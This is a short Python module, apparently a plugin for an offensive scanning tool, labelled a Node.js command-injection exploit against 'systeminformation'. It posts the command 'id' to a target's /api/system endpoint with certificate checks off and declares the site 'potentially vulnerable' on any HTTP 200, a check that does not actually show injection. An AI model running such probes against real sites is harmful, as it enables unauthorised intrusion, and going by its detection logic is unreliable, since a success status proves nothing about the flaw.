import requests
from core.printmodels import *

class NodeJS_RCE_Exploit:
    def __init__(self):
        self.name = "Node.js Command Injection"
        self.description = "Node.js Command Injection in systeminformation"
        self.author = "Mrphoenix"

    def Exploit(self, site):
        try:
            endpoint = f"{site}/api/system"
            payload = {"command": "id"}
            headers = {"Content-Type": "application/json"}
            
            response = requests.post(endpoint, json=payload, headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                return PrintSuccess(f"[Node.js] Potentially vulnerable to command injection!")
            return PrintFailed("[Node.js] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Node.js] Error: {str(e)}")
